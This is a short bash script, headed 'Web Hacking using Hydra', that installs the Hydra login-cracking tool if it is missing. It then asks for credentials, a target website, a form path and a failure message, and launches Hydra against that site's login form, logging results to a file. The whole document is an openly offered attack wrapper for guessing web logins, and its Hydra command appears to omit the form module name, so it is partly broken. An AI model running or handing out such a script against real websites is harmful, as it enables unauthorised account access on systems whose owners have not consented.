#!/bin/bash
#

echo "------------------------------------------"
echo "-*-*-*-*Web Hacking using Hydra*-*-*-*-*-"
echo "------------------------------------------"
hy=$(hydra -v | grep hydra | awk '{print $1}')

if [ "$hy" == "Hydra" ]; then
	echo " Hydra is present. "
	echo "~~~~~~~~~~~~~~~~~~~"
else  
	sudo apt install hydra -y 
	echo " Hydra successfully installed. "
	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
fi 
read -p "Enter your username: " username
echo "************************"
read -p "Enter your password: " password
echo "=-=-=-=-=-=-=-=-=-=-=-=-="
read -p "Enter your target website: " Target
echo "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_"
read -p "Enter your website php/html: " website
echo "+--+-+-*+-+-+-+-+-+-+-+-+-+-+-+-+"
read -p "Enter your error message: " msg
echo "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
read -p "Enter your text file name: " txt
echo "- - - - - - - - - - - - - - - "

hydra -l $username -p $password $Target " $website:username=^USER^&password=^PASS^:$msg" -vV -o $txt

